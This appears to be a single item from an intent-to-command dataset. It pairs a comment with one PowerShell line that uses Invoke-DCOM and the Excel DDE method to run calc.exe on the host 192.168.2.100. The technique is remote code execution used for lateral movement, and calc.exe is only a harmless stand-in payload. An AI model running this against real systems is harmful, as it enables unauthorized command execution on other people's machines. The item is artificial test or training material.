# Natural language intent:
# Invoke DCOM to execute Excel DDE (Dynamic Data Exchange) method with the command 'calc.exe'.

Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command 'calc.exe'
